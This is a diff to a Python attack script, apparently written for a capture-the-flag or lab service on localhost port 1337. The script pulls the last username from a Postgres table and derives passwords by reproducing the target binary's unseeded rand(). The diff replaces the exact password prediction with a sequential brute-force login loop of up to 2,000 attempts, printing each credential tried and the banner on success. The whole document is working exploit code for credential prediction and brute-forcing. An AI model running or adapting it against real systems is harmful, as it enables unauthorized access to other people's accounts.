@@ -3,10 +3,8 @@
 
 Steps:
  1) Reads only the last username from the given Postgres table.
- 2) Generates passwords exactly like the binary: for each account, 32 chars of (rand()%25)+65,
-    with global rand() seeded to 1 (binary never calls srand). We advance rand() for each
-    prior account to reach the correct password for the last one.
- 3) Connects to the service over TCP and tries to log in, printing the result and banner.
+ 2) Generates passwords exactly like the binary: 32 chars of (rand()%25)+65 with srand(1).
+    Tries passwords sequentially until login succeeds or attempts are exhausted.
 """
 
 import socket
@@ -27,6 +25,7 @@ DB_TABLE = "students"  # "students" or "professors"
 SERVICE_HOST = "127.0.0.1"  # where the binary is exposed
 SERVICE_PORT = 1337  # service TCP port
 CONNECT_TIMEOUT = 5
+MAX_ATTEMPTS = 2000  # set higher if нужно «до посинения»
 # ---------------
 
 
@@ -66,11 +65,8 @@ def fetch_last_account() -> Account:
     cur.close()
     conn.close()
 
-    reset_rand(1)  # match binary: no srand() call, seed defaults to 1
-    for _ in range(max(total - 1, 0)):
-        next_password()
-    pwd = next_password() if total else ""
-    return Account(idx=total - 1, name=last[1] if last else "", password=pwd)
+    reset_rand(1)
+    return Account(idx=total - 1, name=last[1] if last else "", password="")
 
 
 def recv_until(
@@ -107,13 +103,22 @@ def main() -> None:
     if not account.name:
         print("[!] No accounts found")
         return
-    print(f"[+] Trying last account idx={account.idx} name={account.name} from {DB_TABLE}")
+    print(f"[+] Bruting last account idx={account.idx} name={account.name} from {DB_TABLE}")
     as_prof = DB_TABLE == "professors"
-    ok, banner = try_login(account, as_prof)
-    status = "OK" if ok else "FAIL"
-    print(f"[{status}] {account.name} / {account.password}")
-    for line in banner.decode(errors="ignore").splitlines()[:5]:
-        print("  ", line)
+    # reset rand and brute sequentially
+    reset_rand(1)
+    for attempt in range(1, MAX_ATTEMPTS + 1):
+        pwd = next_password()
+        acc = Account(idx=account.idx, name=account.name, password=pwd)
+        ok, banner = try_login(acc, as_prof)
+        status = "OK" if ok else "FAIL"
+        print(f"[{status}] attempt={attempt} {acc.name} / {acc.password}")
+        if ok:
+            for line in banner.decode(errors="ignore").splitlines()[:5]:
+                print("  ", line)
+            break
+    else:
+        print(f"[!] Reached MAX_ATTEMPTS={MAX_ATTEMPTS} without success")
 
 
 if __name__ == "__main__":
